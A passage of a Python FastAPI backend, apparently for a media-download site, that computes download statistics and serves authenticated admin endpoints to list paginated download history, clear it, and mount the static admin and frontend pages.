    ]

    # ── Daily stats (last 7 days) with day names ──
    daily_stats = []
    for i in range(6, -1, -1):
        date_obj = now - timedelta(days=i)
        date_str = date_obj.strftime("%Y-%m-%d")
        day_name = DAY_NAMES[date_obj.weekday()]
        count = 0
        for entry in log:
            ts = entry.get("timestamp", "")
            if ts and ts[:10] == date_str:
                count += 1
        daily_stats.append({"day": day_name, "date": date_str, "downloads": count})

    # ── Today / Week / Month downloads ──
    today_str = now.strftime("%Y-%m-%d")
    week_ago_str = (now - timedelta(days=7)).strftime("%Y-%m-%d")
    month_ago_str = (now - timedelta(days=30)).strftime("%Y-%m-%d")

    today_downloads = 0
    week_downloads = 0
    month_downloads = 0
    for entry in log:
        ts = entry.get("timestamp", "")
        if not ts:
            continue
        entry_date = ts[:10]
        if entry_date == today_str:
            today_downloads += 1
        if entry_date >= week_ago_str:
            week_downloads += 1
        if entry_date >= month_ago_str:
            month_downloads += 1

    # ── Recent downloads (last 20) ──
    sorted_log = sorted(log, key=lambda x: x.get("timestamp", ""), reverse=True)
    recent = []
    for entry in sorted_log[:20]:
        ts = entry.get("timestamp", "")
        time_ago = ""
        if ts:
            try:
                entry_time = datetime.fromisoformat(ts.replace("Z", "+00:00"))
                time_ago = _format_time_ago(entry_time, now)
            except Exception:
                pass
        recent.append({
            "id": entry.get("id", 0),
            "title": entry.get("title", "Unknown"),
            "platform": entry.get("platform", "Other"),
            "quality": entry.get("quality", "—"),
            "size": entry.get("file_size_formatted", "N/A"),
            "time_ago": time_ago,
            "timestamp": ts,
        })

    # ── Total data downloaded ──
    total_size_bytes = sum(e.get("file_size") or 0 for e in log)

    return {
        "totalDownloads": total_downloads,
        "todayDownloads": today_downloads,
        "weeklyDownloads": week_downloads,
        "monthlyDownloads": month_downloads,
        "totalDataBytes": total_size_bytes,
        "totalDataFormatted": format_file_size(total_size_bytes),
        "platformStats": platform_stats,
        "dailyStats": daily_stats,
        "recentDownloads": recent,
    }


@app.get("/api/admin/downloads")
def admin_get_downloads(
    credentials: HTTPBasicCredentials = Depends(verify_admin),
    page: int = Query(1, ge=1),
    limit: int = Query(20, ge=1, le=100),
    platform: Optional[str] = Query(None),
):
    """Return paginated download history for the admin dashboard."""
    log = load_download_log()

    # Filter by platform if specified
    if platform:
        log = [e for e in log if e.get("platform") == platform]

    # Sort by timestamp descending (newest first)
    log.sort(key=lambda x: x.get("timestamp", ""), reverse=True)

    total = len(log)
    start = (page - 1) * limit
    end = start + limit
    paginated = log[start:end]

    # Format relative time for display
    for entry in paginated:
        ts = entry.get("timestamp", "")
        if ts:
            try:
                entry_time = datetime.fromisoformat(ts.replace("Z", "+00:00"))
                entry["time_ago"] = _format_time_ago(entry_time, datetime.now(timezone.utc))
            except Exception:
                entry["time_ago"] = ""
        else:
            entry["time_ago"] = ""

    return {
        "downloads": paginated,
        "total": total,
        "page": page,
        "limit": limit,
        "totalPages": (total + limit - 1) // limit,
    }


def _format_time_ago(past: datetime, now: datetime) -> str:
    """Format a datetime as a human-readable relative time string."""
    diff = now - past
    seconds = int(diff.total_seconds())
    if seconds < 60:
        return "just now"
    elif seconds < 3600:
        return f"{seconds // 60}m ago"
    elif seconds < 86400:
        return f"{seconds // 3600}h ago"
    elif seconds < 604800:
        return f"{seconds // 86400}d ago"
    else:
        return past.strftime("%b %d, %Y")


@app.delete("/api/admin/downloads")
def admin_clear_downloads(credentials: HTTPBasicCredentials = Depends(verify_admin)):
    """Clear all download history."""
    save_download_log([])
    return {"status": "cleared", "message": "Download history cleared"}




# Mount Next.js admin static export (built via `npm run build`)
OUT_DIR = os.path.join(BASE_DIR, "out")
if os.path.isdir(OUT_DIR) and os.path.isfile(os.path.join(OUT_DIR, "index.html")):
    app.mount("/_next", StaticFiles(directory=os.path.join(OUT_DIR, "_next")), name="admin_next")
    app.mount("/admin", StaticFiles(directory=OUT_DIR, html=True), name="admin")

# Redirect /admin -> /admin/ (trailing slash required by StaticFiles)
@app.get("/admin", include_in_schema=False)
def admin_root():
    from fastapi.responses import RedirectResponse
    return RedirectResponse(url="/admin/")

app.mount("/", StaticFiles(directory=FRONTEND_DIR, html=True), name="frontend")